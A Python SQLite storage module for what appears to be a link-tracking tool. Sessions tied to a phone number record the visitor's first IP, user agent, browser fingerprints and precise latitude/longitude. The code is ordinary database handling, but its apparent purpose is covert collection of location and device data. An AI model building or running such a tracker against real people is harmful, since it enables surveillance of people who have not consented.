from __future__ import annotations

import sqlite3
import threading
from pathlib import Path
from typing import Any

from .utils import epoch, jdump, jload, token as new_token, utcnow

SCHEMA = """
PRAGMA journal_mode=WAL;
PRAGMA foreign_keys=ON;

CREATE TABLE IF NOT EXISTS sessions (
    token       TEXT PRIMARY KEY,
    number      TEXT NOT NULL,
    label       TEXT DEFAULT '',
    created_at  TEXT NOT NULL,
    expires_at  INTEGER NOT NULL,
    hits        INTEGER DEFAULT 0,
    ip_first    TEXT DEFAULT '',
    ua_first    TEXT DEFAULT '',
    note        TEXT DEFAULT ''
);

CREATE TABLE IF NOT EXISTS events (
    id      INTEGER PRIMARY KEY AUTOINCREMENT,
    token   TEXT NOT NULL,
    kind    TEXT NOT NULL,
    ts      TEXT NOT NULL,
    ip      TEXT DEFAULT '',
    data    TEXT DEFAULT '{}'
);
CREATE INDEX IF NOT EXISTS idx_events_token ON events(token, id);

CREATE TABLE IF NOT EXISTS fingerprints (
    id      INTEGER PRIMARY KEY AUTOINCREMENT,
    token   TEXT NOT NULL,
    ts      TEXT NOT NULL,
    ip      TEXT DEFAULT '',
    data    TEXT DEFAULT '{}'
);
CREATE INDEX IF NOT EXISTS idx_fp_token ON fingerprints(token, id);

CREATE TABLE IF NOT EXISTS locations (
    id      INTEGER PRIMARY KEY AUTOINCREMENT,
    token   TEXT NOT NULL,
    ts      TEXT NOT NULL,
    lat     REAL,
    lon     REAL,
    acc     REAL,
    data    TEXT DEFAULT '{}'
);
CREATE INDEX IF NOT EXISTS idx_loc_token ON locations(token, id);
"""


class Storage:
    def __init__(self, path: str | Path) -> None:
        self.path = Path(path)
        self.path.parent.mkdir(parents=True, exist_ok=True)
        self._lock = threading.RLock()
        self._conn = sqlite3.connect(str(self.path), check_same_thread=False)
        self._conn.row_factory = sqlite3.Row
        with self._lock:
            self._conn.executescript(SCHEMA)
            self._conn.commit()

    def close(self) -> None:
        with self._lock:
            self._conn.close()

    # ── sessions ────────────────────────────────────────────────
    def create_session(self, number: str, label: str = "", ttl: int = 86400) -> str:
        tok = new_token(16)
        with self._lock:
            self._conn.execute(
                "INSERT INTO sessions(token, number, label, created_at, expires_at)"
                " VALUES (?,?,?,?,?)",
                (tok, number, label, utcnow(), epoch() + ttl),
            )
            self._conn.commit()
        return tok

    def get_session(self, tok: str) -> dict[str, Any] | None:
        with self._lock:
            row = self._conn.execute(
                "SELECT * FROM sessions WHERE token=?", (tok,)
            ).fetchone()
        return dict(row) if row else None

    def touch_session(self, tok: str, ip: str, ua: str) -> None:
        with self._lock:
            self._conn.execute(
                "UPDATE sessions SET hits=hits+1,"
                " ip_first=CASE WHEN ip_first='' THEN ? ELSE ip_first END,"
                " ua_first=CASE WHEN ua_first='' THEN ? ELSE ua_first END"
                " WHERE token=?",
                (ip, ua, tok),
            )
            self._conn.commit()

    def list_sessions(self, limit: int = 100) -> list[dict[str, Any]]:
        with self._lock:
            rows = self._conn.execute(
                "SELECT * FROM sessions ORDER BY created_at DESC LIMIT ?", (limit,)
            ).fetchall()
        return [dict(r) for r in rows]

    def purge_expired(self) -> int:
        with self._lock:
            cur = self._conn.execute("DELETE FROM sessions WHERE expires_at < ?", (epoch(),))
            self._conn.commit()
        return cur.rowcount

    # ── events ──────────────────────────────────────────────────
    def add_event(self, tok: str, kind: str, data: Any, ip: str = "") -> int:
        with self._lock:
            cur = self._conn.execute(
                "INSERT INTO events(token, kind, ts, ip, data) VALUES (?,?,?,?,?)",
                (tok, kind, utcnow(), ip, jdump(data)),
            )
            self._conn.commit()
        return int(cur.lastrowid or 0)

    def list_events(self, tok: str, after: int = 0, limit: int = 500) -> list[dict[str, Any]]:
        with self._lock:
            rows = self._conn.execute(
                "SELECT * FROM events WHERE token=? AND id>? ORDER BY id LIMIT ?",
                (tok, after, limit),
            ).fetchall()
        out = []
        for row in rows:
            item = dict(row)
            item["data"] = jload(item.get("data"), {})
            out.append(item)
        return out

    # ── fingerprints ────────────────────────────────────────────
    def add_fingerprint(self, tok: str, data: Any, ip: str = "") -> int:
        with self._lock:
            cur = self._conn.execute(
                "INSERT INTO fingerprints(token, ts, ip, data) VALUES (?,?,?,?)",
                (tok, utcnow(), ip, jdump(data)),
            )
            self._conn.commit()
        return int(cur.lastrowid or 0)

    def list_fingerprints(self, tok: str) -> list[dict[str, Any]]:
        with self._lock:
            rows = self._conn.execute(
                "SELECT * FROM fingerprints WHERE token=? ORDER BY id", (tok,)
            ).fetchall()
        out = []
        for row in rows:
            item = dict(row)
            item["data"] = jload(item.get("data"), {})
            out.append(item)
        return out

    # ── locations ───────────────────────────────────────────────
    def add_location(
        self, tok: str, lat: float, lon: float, acc: float, data: Any = None
    ) -> int:
        with self._lock:
            cur = self._conn.execute(
                "INSERT INTO locations(token, ts, lat, lon, acc, data) VALUES (?,?,?,?,?,?)",
                (tok, utcnow(), lat, lon, acc, jdump(data or {})),
            )
            self._conn.commit()
        return int(cur.lastrowid or 0)

    def list_locations(self, tok: str) -> list[dict[str, Any]]:
        with self._lock:
            rows = self._conn.execute(
                "SELECT * FROM locations WHERE token=? ORDER BY id", (tok,)
            ).fetchall()
        return [dict(r) for r in rows]

    # ── bundle ──────────────────────────────────────────────────
    def bundle(self, tok: str) -> dict[str, Any]:
        return {
            "session": self.get_session(tok),
            "events": self.list_events(tok),
            "fingerprints": self.list_fingerprints(tok),
            "locations": self.list_locations(tok),
        }